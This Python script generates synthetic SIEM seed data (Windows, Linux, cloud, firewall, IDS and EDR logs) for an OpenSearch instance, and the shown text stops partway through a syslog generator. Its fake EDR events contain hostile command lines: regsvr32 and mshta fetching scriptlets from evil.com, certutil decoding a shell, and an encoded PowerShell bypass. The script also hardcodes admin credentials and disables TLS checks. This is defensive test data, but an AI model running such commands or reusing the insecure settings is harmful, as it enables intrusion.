#!/usr/bin/env python3
"""
Large-scale realistic seed data for NilaChakra OpenSearch.
Target: 5,000+ logs, 1,000+ alerts, all integration types, 30 days back.
"""
import json, uuid, random, urllib.request, urllib.error, ssl, base64, sys
from datetime import datetime, timedelta, timezone

OS_URL = "https://localhost:9200"
OS_USER, OS_PASS = "admin", "LocalDev@2024!"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
creds = base64.b64encode(f"{OS_USER}:{OS_PASS}".encode()).decode()
HDRS = {"Content-Type": "application/json", "Authorization": f"Basic {creds}"}

def bulk_index(index, docs):
    lines = []
    for d in docs:
        lines.append(json.dumps({"index": {"_index": index}}))
        lines.append(json.dumps(d, default=str))
    body = ("\n".join(lines) + "\n").encode()
    r = urllib.request.Request(OS_URL + "/_bulk", data=body,
        headers={**HDRS, "Content-Type": "application/x-ndjson"}, method="POST")
    try:
        with urllib.request.urlopen(r, context=ctx, timeout=30) as res:
            result = json.loads(res.read())
            ok = sum(1 for i in result.get("items",[]) if i.get("index",{}).get("result") in ("created","updated"))
            return ok, len(docs) - ok
    except Exception as e:
        return 0, len(docs)

# ── helpers ─────────────────────────────────
def ts(offset_minutes=0):
    t = datetime.now(timezone.utc) - timedelta(minutes=offset_minutes)
    return t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

def day_idx(offset_minutes=0):
    t = datetime.now(timezone.utc) - timedelta(minutes=offset_minutes)
    return t.strftime("%Y.%m.%d")

def rip(private=False):
    if private:
        return f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
    return f"{random.randint(1,223)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"

def rport(): return random.choice([22,23,25,53,80,110,135,139,143,443,445,465,587,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,9200,27017])
def ruser(): return random.choice(["john.doe","jane.smith","admin","root","svc_backup","svc_sql","bob.jones","alice.wu","SYSTEM","NT AUTHORITY\\SYSTEM","svc_deploy","msmith","rjohnson","devops","dbadmin","webuser","guest"])
def rhost(): return random.choice(["WIN-DC01","WIN-WEB01","WIN-SQL01","WIN-APP02","WIN-FILE03","LINUX-PROXY","LINUX-DB01","LINUX-WEB02","mac-dev-01","WIN-LAPTOP-01","aws-ec2-prod","WIN-EXCHANGE","WIN-SHAREPOINT","LINUX-KAFKA","LINUX-NGINX"])
def rcountry(): return random.choice(["US","US","US","GB","RU","CN","DE","BR","IN","JP","AU","CA","FR","NL","KR","UA","IR","NG","ZA","VN"])
def rcity(): return random.choice(["New York","Los Angeles","London","Moscow","Beijing","Berlin","São Paulo","Mumbai","Tokyo","Sydney","Toronto","Paris","Amsterdam","Seoul","Kyiv"])
def rasn(): return random.choice(["AS3356 Level 3","AS15169 Google","AS8075 Microsoft","AS16509 Amazon","AS13335 Cloudflare","AS1234 Suspicious ISP","AS55555 TOR Exit","AS7922 Comcast","AS4837 China Unicom"])
def rseverity(): return random.choice(["Low","Low","Medium","Medium","Medium","High","High","Critical"])
def rsev_int(label): return {"Low":1,"Medium":2,"High":3,"Critical":3}.get(label,2)

PROCESSES = ["cmd.exe","powershell.exe","wscript.exe","mshta.exe","regsvr32.exe",
             "certutil.exe","msiexec.exe","rundll32.exe","svchost.exe","lsass.exe",
             "explorer.exe","notepad.exe","chrome.exe","python.exe","bash","sh","curl","wget"]
WIN_EVENTS = [4624,4624,4624,4625,4625,4625,4634,4648,4672,4688,4697,4698,4702,
              4719,4720,4722,4724,4728,4732,4740,4756,4767,4768,4769,4776,1100,1102,7034,7036,7045]
LOGON_TYPES = {2:"Interactive",3:"Network",7:"Unlock",10:"RemoteInteractive"}
ATTACK_TACTICS = ["Initial Access","Execution","Persistence","Privilege Escalation","Defense Evasion",
                  "Credential Access","Discovery","Lateral Movement","Collection","Exfiltration",
                  "Command and Control","Impact","Reconnaissance","Resource Development"]
MITRE_TECHNIQUES = ["T1059","T1078","T1110","T1003","T1021","T1055","T1070","T1082","T1083",
                    "T1105","T1190","T1203","T1566","T1571","T1573","T1574","T1547","T1548"]
AWS_REGIONS = ["us-east-1","us-east-2","us-west-1","us-west-2","eu-west-1","eu-central-1","ap-southeast-1","ap-northeast-1"]
AZURE_REGIONS = ["eastus","westus2","westeurope","northeurope","southeastasia","australiaeast"]

# ── Log generators (10 types, ~500 each = 5000 logs) ─────────────────────────

def gen_wineventlog(offset_min):
    ec = random.choice(WIN_EVENTS)
    src_ip = rip(private=random.random() < 0.4)
    user = ruser(); host = rhost()
    lt = random.choice(list(LOGON_TYPES.keys()))
    return {
        "@timestamp": ts(offset_min), "dataType": "windows-security", "dataSource": host,
        "logx": {"wineventlog": {
            "event_id": ec, "log_name": "Security", "record_number": random.randint(10000,9999999),
            "computer_name": host, "level": random.choice(["INFO","WARN","ERROR","CRIT"]),
            "event_name": {4624:"An account was successfully logged on",4625:"An account failed to log on",
                4688:"A new process has been created",4697:"A service was installed in the system",
                4698:"A scheduled task was created",4768:"A Kerberos authentication ticket was requested",
                4769:"A Kerberos service ticket was requested",1102:"The audit log was cleared",
                7045:"A new service was installed",4740:"A user account was locked out",
                4728:"A member was added to a security-enabled global group",
                4732:"A member was added to a security-enabled local group"}.get(ec, f"Windows Security Event {ec}"),
            "event_data": {
                "SubjectUserName": user, "SubjectDomainName": "CORP",
                "TargetUserName": ruser(), "TargetDomainName": "CORP",
                "IpAddress": src_ip, "IpPort": str(rport()),
                "LogonType": str(lt), "LogonTypeName": LOGON_TYPES.get(lt,"Network"),
                "ProcessName": random.choice(PROCESSES[:8]),
                "ProcessId": f"0x{random.randint(100,9999):x}",
                "TokenElevationType": "%%1936", "Status": "0xC000006D",
                "SubStatus": random.choice(["0xC0000064","0xC000006A","0xC0000234"]),
                "WorkstationName": host, "AuthPackageName": "NTLM",
                "KeyLength": "0", "ServiceName": f"SVC{random.randint(1,99):02d}"
            }
        }},
        "origin": {"ip": src_ip,"port": rport(),"host": host,
                   "country": rcountry(),"city": rcity(),"asn": rasn(),"user": user},
        "target": {"ip": rip(private=True),"port": rport(),"host": rhost(),"user": ruser()},
        "log": {"eventCode": ec}, "tags": []
    }

def gen_linux(offset_min):
    prog = random.choice(["sshd","sudo","su","cron","kernel","systemd","auditd","bash","passwd","useradd","iptables","nginx","apache2","mysqld"])
    user = ruser(); src_ip = rip()
    host = rhost()
    msg_map = {
        "sshd": [f"Failed password for {user} from {src_ip} port {rport()} ssh2",
                 f"Accepted publickey for {user} from {src_ip} port {rport()}: RSA SHA256:abc123",
                 f"Invalid user {user} from {src_ip}",
                 f"Connection closed by authenticating user {user} {src_ip} port {rport()} [preauth]",
                 f"PAM service(sshd) ignoring max retries; {random.randint(3,10)} > 3"],
        "sudo": [f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash",
                 f"{user} : command not allowed ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/passwd root",
                 f"session opened for user root by {user}(uid=0)"],
        "kernel": [f"TCP: drop open request from {src_ip}:{rport()} to 0.0.0.0:22",
                   f"Possible SYN flooding on port {rport()}. Sending cookies. Check SNMP counters.",
                   f"nf_conntrack: table full, dropping packet"],
        "auditd": [f"type=USER_AUTH msg=audit: op=macsec_activate acct={user} res=failed",
                   f"type=EXECVE msg=audit: argc=3 a0=\"curl\" a1=\"-s\" a2=\"http://{src_ip}/payload.sh\"",
                   f"type=PROCTITLE msg=audit: proctitle=736800"],
        "nginx": [f'{src_ip} - {user} [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S")} +0000] "GET /admin HTTP/1.1" 403 162',
                  f'{src_ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S")} +0000] "POST /api/login HTTP/1.1" {random.choice([200,401,403,500])} {random.randint(100,5000)}']
    }
    msg = random.choice(msg_map.get(prog, [f"{prog}: operation performed by {user} from {src_ip}"]))
    return {
        "@timestamp": ts(offset_min), "dataType": "linux-auth", "dataSource": host,
        "logx": {"linux": {"message": msg,"program": prog,"pid": random.randint(1000,65000),
                           "hostname": host,"facility": random.choice(["auth","authpriv","daemon","kern","syslog"]),
                           "severity": random.choice(["debug","info","notice","warning","error","crit","alert","emerg"])}},
        "origin": {"ip": src_ip,"port": rport(),"host": host,"country": rcountry(),"city": rcity(),"user": user},
        "target": {"ip": rip(private=True),"host": rhost()}, "tags": []
    }

def gen_aws(offset_min):
    events = ["ConsoleLogin","AssumeRole","CreateUser","DeleteUser","AttachRolePolicy","DetachRolePolicy",
              "CreateBucket","DeleteBucket","PutBucketAcl","PutBucketPolicy","GetObject","PutObject",
              "DeleteObject","DescribeInstances","RunInstances","StopInstances","TerminateInstances",
              "AuthorizeSecurityGroupIngress","RevokeSecurityGroupIngress","CreateSecurityGroup",
              "DeleteSecurityGroup","GetSecretValue","ListSecrets","CreateKey","ScheduleKeyDeletion",
              "GetCallerIdentity","ListUsers","ListRoles","CreateVpc","DeleteVpc","ModifyInstanceAttribute",
              "CreateSnapshot","DeleteSnapshot","StartLogging","StopLogging","UpdateTrail"]
    service = random.choice(["signin","iam","s3","ec2","kms","secretsmanager","cloudtrail","lambda","rds","sts"])
    event = random.choice(events)
    src_ip = rip(); acct = str(random.randint(100000000000,999999999999))
    user = ruser(); region = random.choice(AWS_REGIONS)
    error = random.random() < 0.25
    return {
        "@timestamp": ts(offset_min), "dataType": "aws-cloudtrail",
        "dataSource": f"aws-{acct}",
        "logx": {"aws": {
            "eventVersion": "1.08", "eventTime": ts(offset_min),
            "eventSource": f"{service}.amazonaws.com", "eventName": event,
            "awsRegion": region, "sourceIPAddress": src_ip,
            "userAgent": random.choice(["aws-cli/2.9.0 Python/3.11","Boto3/1.26","console.amazonaws.com","aws-sdk-go/1.44","Terraform/1.4"]),
            "userIdentity": {"type": random.choice(["IAMUser","AssumedRole","Root","Service"]),
                             "principalId": f"AIDAAAAAA{random.randint(10000,99999)}",
                             "arn": f"arn:aws:iam::{acct}:user/{user}",
                             "accountId": acct, "userName": user},
            "requestParameters": {"bucketName": f"nilachakra-{random.choice(['logs','backup','data','reports'])}"} if "Bucket" in event or "Object" in event else {"instanceId": f"i-{uuid.uuid4().hex[:16]}"},
            "responseElements": {"ConsoleLogin": "Success"} if event == "ConsoleLogin" and not error else None,
            "errorCode": random.choice(["AccessDenied","NoSuchKey","InvalidClientTokenId","UnauthorizedOperation"]) if error else None,
            "errorMessage": "User is not authorized to perform this action" if error else None,
            "requestID": str(uuid.uuid4()).replace("-","").upper()[:20],
            "eventID": str(uuid.uuid4()),
            "readOnly": random.random() < 0.5,
            "recipientAccountId": acct,
            "managementEvent": True
        }},
        "origin": {"ip": src_ip,"country": rcountry(),"user": user,"asn": rasn()},
        "target": {"ip": rip()}, "tags": []
    }

def gen_o365(offset_min):
    ops = ["UserLoggedIn","PasswordLogonInitial","FileAccessed","FileDownloaded","FileUploaded","FileDeleted",
           "FolderCreated","FileMoved","FileCopied","FileRenamed","SharingSet","AnonymousLinkCreated",
           "MailboxLogin","Send","MoveToDeletedItems","HardDelete","New-InboxRule","Set-InboxRule",
           "Add-MailboxPermission","Remove-MailboxPermission","Set-MailboxFolderPermission",
           "Set-MalwareFilterPolicy","UpdateInboxRules","SearchQueryInitiatedSharePoint",
           "TeamCreated","MemberAdded","MemberRemoved","AppInstalled","AppUninstalled"]
    workloads = ["Exchange","SharePoint","OneDrive","Teams","AzureActiveDirectory","SecurityComplianceCenter"]
    user = ruser() + "@nilachakra.com"
    src_ip = rip(); op = random.choice(ops)
    wl = random.choice(workloads)
    return {
        "@timestamp": ts(offset_min), "dataType": "o365",
        "dataSource": "o365-nilachakra-tenant",
        "logx": {"o365": {
            "Operation": op, "UserId": user, "ClientIP": src_ip,
            "UserAgent": random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Microsoft Office/16.0","Outlook/16.0","Edge/120.0","OfficeMobile/16.0"]),
            "Platform": random.choice(["Windows","Mac","iOS","Android","Web"]),
            "DeviceDisplayName": random.choice(["Corp-Laptop-01","Personal-iPhone","Unknown Device"]),
            "Workload": wl,
            "ObjectId": f"https://nilachakra-my.sharepoint.com/Documents/file{random.randint(1,500)}.{random.choice(['docx','xlsx','pdf','pptx'])}",
            "SiteUrl": f"https://nilachakra.sharepoint.com/sites/{random.choice(['IT','Finance','HR','Legal','Engineering'])}",
            "SourceFileName": f"report_{random.randint(1,100)}.xlsx",
            "DestinationFileName": f"report_{random.randint(1,100)}_copy.xlsx",
            "ResultStatus": random.choice(["Succeeded","Succeeded","Succeeded","Failed","PartiallySucceeded"]),
            "ErrorNumber": None if random.random() > 0.15 else str(random.choice([403,404,500])),
            "IsCompliant": random.choice([True,True,False]),
            "AuthenticationType": random.choice(["OAuth2","Federated","OAuthToken","Modern"]),
            "Country": rcountry(),
            "RecordType": random.randint(1,100),
            "OrganizationId": str(uuid.uuid4()),
            "MailboxGuid": str(uuid.uuid4()),
            "ClientInfoString": f"Client=OWA;Action={op}"
        }},
        "origin": {"ip": src_ip,"country": rcountry(),"city": rcity(),"user": user},
        "target": {"host": "nilachakra.sharepoint.com"}, "tags": []
    }

def gen_firewall(offset_min):
    vendors = ["pfsense","cisco-asa","fortinet","paloalto","sonicwall","mikrotik"]
    vendor = random.choice(vendors)
    actions = ["allow","allow","allow","deny","drop","reject"]
    protocols = ["TCP","TCP","TCP","UDP","ICMP","GRE","ESP"]
    src_ip = rip(private=random.random()<0.3); dst_ip = rip(private=random.random()<0.5)
    action = random.choice(actions)
    proto = random.choice(protocols)
    return {
        "@timestamp": ts(offset_min), "dataType": f"firewall-{vendor}",
        "dataSource": random.choice(["FW-EDGE-01","FW-DMZ-01","FW-INTERNAL","NGFW-MAIN","ASA-PRIMARY"]),
        "logx": {"firewall": {
            "vendor": vendor,"action": action,"protocol": proto,
            "src_ip": src_ip,"src_port": rport(),
            "dst_ip": dst_ip,"dst_port": rport(),
            "bytes_sent": random.randint(64,104857600),
            "bytes_recv": random.randint(64,104857600),
            "packets": random.randint(1,100000),
            "duration_sec": random.randint(0,86400),
            "interface_in": random.choice(["eth0","WAN","outside","untrust","ge-0/0/0"]),
            "interface_out": random.choice(["eth1","LAN","inside","trust","ge-0/0/1"]),
            "rule_id": str(random.randint(1,9999)),
            "rule_name": random.choice(["PERMIT_WEB","DENY_EXTERNAL","ALLOW_VPN","DEFAULT_DENY","BLOCK_TOR","PERMIT_SMTP","DENY_SCAN"]),
            "policy_name": f"Policy_{random.randint(1,50)}",
            "application": random.choice(["web-browsing","ssl","dns","smtp","rdp","ssh","ftp","unknown","torrenting"]),
            "category": random.choice(["news","business","malware","phishing","adult","p2p","trusted"]),
            "nat_src": rip(private=True) if action == "allow" else None,
            "nat_dst": rip() if action == "allow" else None,
            "threat_name": random.choice([None,None,None,"Botnet-C2","Exploit-Kit","Ransomware-Traffic"]),
            "severity": random.choice(["informational","low","medium","high","critical"])
        }},
        "origin": {"ip": src_ip,"port": rport(),"country": rcountry(),"asn": rasn()},
        "target": {"ip": dst_ip,"port": rport()},
        "network": {"bytes_toclient": random.randint(64,104857600),"bytes_toserver": random.randint(64,104857600),
                    "proto": proto.lower()},
        "tags": []
    }

def gen_cisco_asa(offset_min):
    msg_ids = [106001,106006,106007,106015,106023,110003,302013,302014,302020,305009,
               313001,313004,402114,419001,419002,500004,605005,710003,713172,716039,722051]
    src_ip = rip(); dst_ip = rip(private=True); msg_id = random.choice(msg_ids)
    sev_map = {106001:2,106023:4,302013:6,302014:6,710003:3,605005:5,716039:6}
    sev = sev_map.get(msg_id, random.randint(2,7))
    templates = {
        106001: f"Inbound TCP connection denied from {src_ip}/{rport()} to {dst_ip}/{rport()} flags SYN  on interface outside",
        106023: f"Deny tcp src outside:{src_ip}/{rport()} dst inside:{dst_ip}/{rport()} by access-group \"OUTSIDE_IN\" [0x{random.randint(0,0xffffff):06x}, 0x0]",
        302013: f"Built outbound TCP connection {random.randint(100000,9999999)} for outside:{src_ip}/{rport()} ({src_ip}/{rport()}) to inside:{dst_ip}/{rport()} ({dst_ip}/{rport()})",
        302014: f"Teardown TCP connection {random.randint(100000,9999999)} for outside:{src_ip}/{rport()} to inside:{dst_ip}/{rport()} duration 0:0{random.randint(0,9)}:{random.randint(10,59)} bytes {random.randint(500,500000)} TCP FINs",
        710003: f"TCP access denied by ACL from {src_ip}/{rport()} to outside:{dst_ip}/443",
        605005: f"Login permitted from {src_ip}/{rport()} to outside:{dst_ip}/22 for user \"{ruser()}\"",
        716039: f"Group <TunnelGroup1> User <{ruser()}> IP <{src_ip}> AnyConnect session resumed connection from IP <{rip()}>",
        419001: f"Dropping TCP packet from outside:{src_ip}/{rport()} to inside:{dst_ip}/{rport()}, reason: MSS exceeded, MSS 1380, data 1460"
    }
    msg = templates.get(msg_id, f"%ASA-{sev}-{msg_id}: Connection event src:{src_ip} dst:{dst_ip}")
    return {
        "@timestamp": ts(offset_min), "dataType": "cisco-asa",
        "dataSource": random.choice(["ASA-PRIMARY","ASA-SECONDARY","FTD-01","FTD-02"]),
        "logx": {"cisco_asa": {"message_id": msg_id,"message": msg,"severity": str(sev),
                               "src_ip": src_ip,"src_port": rport(),
                               "dst_ip": dst_ip,"dst_port": rport(),
                               "protocol": random.choice(["TCP","UDP","ICMP"]),
                               "interface": random.choice(["outside","inside","dmz","vpn"])}},
        "origin": {"ip": src_ip,"port": rport(),"country": rcountry(),"asn": rasn()},
        "target": {"ip": dst_ip,"port": rport()}, "tags": []
    }

def gen_suricata(offset_min):
    sigs = [
        (2001219,"ET SCAN Potential SSH Scan","Attempted Information Leak",3),
        (2010937,"ET MALWARE Suspicious User-Agent (curl)","Malware CNC",2),
        (2019714,"ET EXPLOIT EternalBlue Attempt","Attempted Admin Privilege Gain",1),
        (2100498,"GPL ATTACK_RESPONSE id check returned root","Potentially Bad Traffic",2),
        (2012648,"ET COMPROMISE Possible Compromised Device Checkin","Misc Attack",2),
        (2023468,"ET HUNTING Suspicious TLS SNI","Potentially Bad Traffic",3),
        (2024897,"ET HUNTING Possible Cobalt Strike Beacon","Trojan Activity",1),
        (2028371,"ET MALWARE Possible Empire Powershell Stager","Malware CNC",1),
        (2013028,"ET POLICY curl User-Agent Outbound","Potential Corporate Privacy Violation",3),
        (2016657,"ET EXPLOIT Apache Struts RCE","Exploit Attempt",1),
        (2022051,"ET SCAN Nmap Scripting Engine Scan","Active Scanning",2),
        (2027865,"ET MALWARE Metasploit Meterpreter Reverse TCP","Trojan Activity",1),
        (2014520,"ET SCAN Masscan scanning","Active Scanning",2),
        (2018959,"ET HUNTING SUSPICIOUS Self Signed SSL Certificate","Potentially Bad Traffic",3),
        (2025697,"ET TROJAN Ransomware Communication Detected","Trojan Activity",1)
    ]
    sig = random.choice(sigs)
    src_ip = rip(); dst_ip = rip(private=random.random()<0.5)
    proto = random.choice(["TCP","TCP","TCP","UDP","ICMP"])
    return {
        "@timestamp": ts(offset_min), "dataType": "suricata",
        "dataSource": random.choice(["SURICATA-SENSOR-01","IDS-DMZ","IPS-EDGE","SENSOR-CORE"]),
        "logx": {"suricata": {
            "alert": {"action": random.choice(["allowed","allowed","blocked"]),"gid":1,
                      "signature_id": sig[0],"rev":random.randint(1,10),
                      "signature": sig[1],"category": sig[2],"severity": sig[3]},
            "src_ip": src_ip,"src_port": rport(),
            "dest_ip": dst_ip,"dest_port": rport(),
            "proto": proto,"app_proto": random.choice(["http","tls","dns","smtp","ssh","smb","unknown"]),
            "flow_id": random.randint(1000000000,9999999999),
            "in_iface": random.choice(["eth0","eth1","ens3","bond0"]),
            "flow": {"pkts_toserver": random.randint(1,1000),"pkts_toclient": random.randint(1,1000),
                     "bytes_toserver": random.randint(100,10000000),"bytes_toclient": random.randint(100,10000000),
                     "start": ts(offset_min+1)},
            "http": {"hostname": f"evil-{random.randint(1,100)}.example.com","url": f"/{uuid.uuid4().hex[:8]}",
                     "http_method": "GET","status": random.choice([200,404,500,302])} if proto == "TCP" else None,
            "tls": {"subject": f"CN={rip()}","issuerdn": "Self-signed","fingerprint": uuid.uuid4().hex,
                    "version": random.choice(["TLS 1.2","TLS 1.3"])} if random.random() < 0.3 else None
        }},
        "origin": {"ip": src_ip,"port": rport(),"country": rcountry(),"asn": rasn()},
        "target": {"ip": dst_ip,"port": rport()}, "tags": []
    }

def gen_azure(offset_min):
    ops = ["Microsoft.Compute/virtualMachines/write","Microsoft.Compute/virtualMachines/delete",
           "Microsoft.Storage/storageAccounts/delete","Microsoft.Storage/storageAccounts/write",
           "Microsoft.KeyVault/vaults/secrets/read","Microsoft.KeyVault/vaults/keys/read",
           "Microsoft.Authorization/roleAssignments/write","Microsoft.Authorization/roleAssignments/delete",
           "Microsoft.Network/networkSecurityGroups/write","Microsoft.Network/networkSecurityGroups/securityRules/write",
           "Microsoft.Sql/servers/firewallRules/write","Microsoft.Sql/servers/databases/delete",
           "Microsoft.Resources/deployments/write","Microsoft.Insights/alertRules/write",
           "Microsoft.AAD/auditLogs/read","Microsoft.AAD/signInLogs/read",
           "Microsoft.Compute/disks/write","Microsoft.ContainerService/managedClusters/write"]
    categories = ["Administrative","Security","Security","Policy","Alert","SignInLogs","AuditLogs","ServiceHealth"]
    src_ip = rip()
    op = random.choice(ops)
    cat = random.choice(categories)
    level = "Error" if random.random() < 0.15 else random.choice(["Informational","Warning"])
    result = "Failure" if level == "Error" else random.choice(["Success","Success","Start"])
    return {
        "@timestamp": ts(offset_min), "dataType": "azure",
        "dataSource": f"azure-sub-{random.randint(1,5)}",
        "logx": {"azure": {
            "operationName": op, "category": cat,
            "callerIpAddress": src_ip,
            "caller": ruser() + f"@nilachakra.onmicrosoft.com",
            "correlationId": str(uuid.uuid4()),
            "level": level,
            "resultType": result,
            "resultSignature": "Succeeded" if result == "Success" else random.choice(["BadRequest","Unauthorized","Forbidden","NotFound"]),
            "durationMs": random.randint(10,10000),
            "subscriptionId": str(uuid.uuid4()),
            "resourceGroup": random.choice(["rg-prod","rg-dev","rg-security","rg-network","rg-data"]),
            "resourceType": op.split("/")[0].split(".")[-1],
            "resourceId": f"/subscriptions/{uuid.uuid4()}/resourceGroups/rg-prod/providers/{op.rsplit('/',2)[0]}/resource{random.randint(1,20)}",
            "location": random.choice(AZURE_REGIONS),
            "tenantId": str(uuid.uuid4()),
            "identity": {"authorization": {"action": op,"scope": "/subscriptions"},
                         "claims": {"oid": str(uuid.uuid4()),"upn": ruser()+"@nilachakra.com"}}
        }},
        "origin": {"ip": src_ip,"country": rcountry(),"user": ruser()},
        "target": {"ip": rip()}, "tags": []
    }

def gen_crowdstrike(offset_min):
    event_types = ["AuthActivityAuditEvent","DetectionSummaryEvent","IncidentSummaryEvent",
                   "NetworkConnectionIP4","ProcessRollupV2","UserActivityAuditEvent",
                   "SyntheticRemediation","CriticalFileAccessed","RemovableDiskDriveDetected"]
    detect_names = ["Credential Theft via LSASS","Lateral Movement via SMB","Suspicious PowerShell",
                    "Ransomware-like File Modification","Malicious Script Execution","Data Exfiltration via HTTPS",
                    "Privilege Escalation via Token Manipulation","Process Injection Detected",
                    "Remote Access Tool Deployed","Kernel Driver Loaded","Pass-the-Hash Attack"]
    techniques = [f"T{n}" for n in [1003,1021,1059,1055,1071,1078,1082,1086,1110,1140,1190,1210,1566,1574]]
    host = rhost(); user = ruser(); src_ip = rip()
    sev = random.randint(20,100)
    sev_name = "Critical" if sev>80 else "High" if sev>60 else "Medium" if sev>40 else "Low"
    return {
        "@timestamp": ts(offset_min), "dataType": "crowdstrike",
        "dataSource": f"crowdstrike-cid-{random.randint(1000,9999)}",
        "logx": {"crowdstrike": {
            "EventType": random.choice(event_types),
            "DetectId": f"ldt:{uuid.uuid4().hex}:{random.randint(10000,99999)}",
            "DetectName": random.choice(detect_names),
            "Severity": sev,"SeverityName": sev_name,
            "Tactic": random.choice(ATTACK_TACTICS),"Technique": random.choice(techniques),
            "ComputerName": host,"UserName": user,"LocalIP": rip(private=True),
            "FileName": random.choice(PROCESSES),
            "FilePath": random.choice(["C:\\Windows\\Temp\\","C:\\Users\\Public\\","C:\\ProgramData\\Temp\\","/tmp/","/var/tmp/"]),
            "SHA256": uuid.uuid4().hex * 2,
            "MD5": uuid.uuid4().hex,
            "CommandLine": random.choice([
                "powershell -nop -exec bypass -enc " + base64.b64encode(b"whoami /all").decode(),
                "cmd /c net user /domain","certutil -decode b64.txt shell.exe",
                "regsvr32 /u /s /i:http://evil.com/payload.sct scrobj.dll",
                "wmic process call create \"cmd /c whoami > C:\\Windows\\Temp\\out.txt\"",
                "python3 -c 'import socket,os,pty;...'",
                "mshta javascript:a=(GetObject('script:http://evil.com/a.sct')).Exec()"]),
            "ParentFileName": random.choice(["explorer.exe","winword.exe","excel.exe","outlook.exe","chrome.exe"]),
            "ParentCommandLine": f"\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" {uuid.uuid4().hex[:8]}.docm",
            "LocalAddress": src_ip,"RemoteAddress": rip(),
            "LocalPort": rport(),"RemotePort": rport(),
            "GrandparentFileName": "services.exe",
            "IOCType": random.choice(["hash_sha256","domain","ipv4","file_path"]),
            "IOCValue": str(uuid.uuid4()),
            "PatternDispositionDescription": random.choice(["Prevention","Detection","No Action Taken"])
        }},
        "origin": {"ip": src_ip,"host": host,"user": user,"country": rcountry()},
        "target": {"ip": rip()}, "tags": []
    }

def gen_netflow(offset_min):
    proto_map = {6:"TCP",17:"UDP",1:"ICMP",47:"GRE",50:"ESP",89:"OSPF",132:"SCTP"}
    proto_num = random.choice([6,6,6,17,17,1,47,50])
    src_ip = rip(private=random.random()<0.4); dst_ip = rip(private=random.random()<0.3)
    bytes_in = random.randint(64,104857600); bytes_out = random.randint(64,104857600)
    return {
        "@timestamp": ts(offset_min), "dataType": "netflow",
        "dataSource": random.choice(["ROUTER-CORE-01","ROUTER-EDGE-01","SWITCH-DIST-01","COLLECTOR-01"]),
        "logx": {"netflow": {
            "src_addr": src_ip,"dst_addr": dst_ip,
            "src_port": rport(),"dst_port": rport(),
            "protocol": proto_num,"proto_name": proto_map.get(proto_num,"UNKNOWN"),
            "bytes_in": bytes_in,"bytes_out": bytes_out,
            "pkts_in": random.randint(1,100000),"pkts_out": random.randint(1,100000),
            "flow_start": ts(offset_min+1),"flow_end": ts(offset_min),
            "duration_ms": random.randint(10,86400000),
            "tcp_flags": random.choice(["SYN","SYN-ACK","FIN","RST","PSH-ACK","SYN-FIN","URG"]),
            "tos": random.choice([0,8,16,24,32]),
            "input_snmp": random.randint(1,200),"output_snmp": random.randint(1,200),
            "src_as": random.randint(1000,65535),"dst_as": random.randint(1000,65535),
            "src_mask": random.randint(16,32),"dst_mask": random.randint(8,32),
            "next_hop": rip(private=True),
            "engine_type": 1,"engine_id": random.randint(0,255),
            "sampling_interval": random.choice([1,512,1000]),
            "exporter": random.choice(["192.168.1.1","192.168.1.254","10.0.0.1"])
        }},
        "origin": {"ip": src_ip,"port": rport(),"country": rcountry(),"asn": rasn()},
        "target": {"ip": dst_ip,"port": rport()},
        "network": {"bytes_toclient": bytes_out,"bytes_toserver": bytes_in,
                    "proto": proto_map.get(proto_num,"unknown").lower()},
        "tags": []
    }

def gen_github(offset_min):
    events = ["push","pull_request","create","delete","fork","issues","issue_comment","member",
              "organization","public","release","repository","team","team_add",
              "audit_log.repos.create","audit_log.repos.delete","audit_log.hook.create",
              "audit_log.org.oauth_application.authorize","secret_scanning_alert","code_scanning_alert"]
    user = ruser()
    repo = random.choice(["nilachakra-backend","nilachakra-frontend","infra-terraform","nilachakra-agent","security-playbooks"])
    return {
        "@timestamp": ts(offset_min), "dataType": "github",
        "dataSource": f"github-org-nilachakra",
        "logx": {"github": {
            "event": random.choice(events),
            "actor": user,
            "action": random.choice(["created","deleted","modified","pushed","forked","protected","unprotected"]),
            "repository": f"nilachakra/{repo}",
            "repository_public": random.choice([True,False]),
            "organization": "nilachakra",
            "team": f"team-{random.choice(['security','devops','backend','frontend'])}",
            "ref": f"refs/heads/{random.choice(['main','develop','feature/auth-fix','hotfix/sec-patch'])}",
            "before": uuid.uuid4().hex[:40],"after": uuid.uuid4().hex[:40],
            "created": random.choice([True,False]),"forced": random.choice([True,False]),
            "deleted": random.choice([True,False]),
            "commits": random.randint(0,20),
            "ip": rip(),"user_agent": "git/2.39.0",
            "programmatic_access_type": random.choice(["OAuth App","GitHub App","Personal access token",None]),
            "hashed_token": uuid.uuid4().hex if random.random() < 0.5 else None
        }},
        "origin": {"ip": rip(),"country": rcountry(),"user": user},
        "target": {"host": "github.com"}, "tags": []
    }

def gen_syslog(offset_min):
    facilities = ["kernel","user","mail","daemon","auth","syslog","lpr","news","uucp","cron","authpriv","ftp","local0","local7"]
    severities = ["emerg","alert","crit","err","warning","notice","info","debug"]
    host = rhost()
    msgs = [
        f"kernel: [UFW BLOCK] IN=eth0 OUT= MAC=ff:ff:ff:ff SRC={rip()} DST={rip(private=True)} PROTO=TCP SPT={rport()} DPT={rport()} WINDOW=65535",
        f"CRON[{random.randint(1000,9999)}]: (root) CMD (/usr/sbin/ntpdate -s time.nist.gov)",
        f"postfix/smtp[{random.randint(1000,9999)}]: connect to mx.example.com[{rip()}]:{rport()}: Connection refused",
        f"systemd[1]: Started {random.choice(['nginx','apache2','mysql','postgresql','redis'])} service.",
        f"kernel: oom-killer: gfp_mask=0x{random.randint(0,0xffffff):x}, order=0, oom_score_adj=0",
        f"auth: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={rip()} user={ruser()}",
        f"rsyslog: action 'action-0-builtin:omfile' resumed (module 'builtin:omfile')",
        f"NetworkManager[{random.randint(1000,9999)}]: <info> device (eth0): state change: activated -> deactivated (reason 'carrier-changed')"
    ]
    return {
